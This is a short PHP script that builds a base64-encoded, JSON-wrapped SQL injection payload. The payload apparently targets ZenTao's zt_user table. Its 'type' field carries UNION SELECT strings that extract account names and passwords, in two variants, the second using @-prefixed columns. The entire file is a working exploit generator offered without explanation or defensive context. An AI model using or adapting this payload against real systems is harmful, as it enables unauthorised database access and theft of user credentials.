<?php
	$exp = new stdclass();
	$exp->account = "admin";
	$exp->type = "id=-1 UNION SELECT 1,2,3,4,5,6,account,8,9,password,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8 FROM zt_user#";
	$exp->type = "id=-1 UNION SELECT @1,@2,@3,@4,@5,@6,account,@8,@9,password,@1,@2,@3,@4,@5,@6,@7,@8,@9,@0,@1,@2,@3,@4,@5,@6,@7,@8,@9,@0,@1,@2,@3,@4,@5,@6,@7,@8 FROM zt_user#";
	

	echo base64_encode(json_encode($exp));
